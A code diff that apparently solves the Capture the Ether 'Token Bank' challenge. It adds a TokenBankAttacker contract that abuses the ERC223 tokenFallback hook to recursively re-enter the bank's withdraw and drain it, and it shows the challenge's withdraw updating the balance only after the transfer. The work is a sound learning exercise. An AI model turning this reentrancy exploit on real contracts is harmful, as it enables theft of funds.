@@ -1,3 +1,4 @@
+
 pragma solidity ^0.4.21;
 
 interface ITokenReceiver {
@@ -56,18 +57,11 @@ contract SimpleERC223Token {
         return true;
     }
 
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
+    event Approval(address indexed owner, address indexed spender, uint256 value);
 
     mapping(address => mapping(address => uint256)) public allowance;
 
-    function approve(address spender, uint256 value)
-        public
-        returns (bool success)
-    {
+    function approve(address spender, uint256 value) public returns (bool success) {
         allowance[msg.sender][spender] = value;
         emit Approval(msg.sender, spender, value);
         return true;
@@ -122,5 +116,45 @@ contract TokenBankChallenge {
 
         require(token.transfer(msg.sender, amount));
         balanceOf[msg.sender] -= amount;
+    }
+}
+
+contract TokenBankAttacker {
+    TokenBankChallenge private bankContract;
+    SimpleERC223Token private tokenContract;
+
+    function TokenBankAttacker(address _bankContract, address _tokenContract) public {
+        bankContract = TokenBankChallenge(_bankContract);
+        tokenContract = SimpleERC223Token(_tokenContract);
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes
+    ) public {
+        if (from != address(bankContract)) return;
+        withdraw();
+    }
+
+    function deposit() public {
+        bankContract.token().transfer(address(bankContract), 500000 * 10**18);
+    }
+
+    function withdraw() public {
+        // this one is the bugged one, does not update after withdraw
+        uint256 myInitialBalance = bankContract.balanceOf(address(this));
+        // this one from the token contract, updates after withdraw
+        uint256 challengeTotalRemainingBalance = bankContract.token().balanceOf(address(bankContract));
+        // are there more tokens to empty?
+        bool keepRecursing = challengeTotalRemainingBalance > 0;
+
+        if (keepRecursing) {
+            // can only withdraw at most our initial balance per withdraw call
+            uint256 toWithdraw = myInitialBalance < challengeTotalRemainingBalance
+                ? myInitialBalance
+                : challengeTotalRemainingBalance;
+            bankContract.withdraw(toWithdraw);
+        }
     }
 }
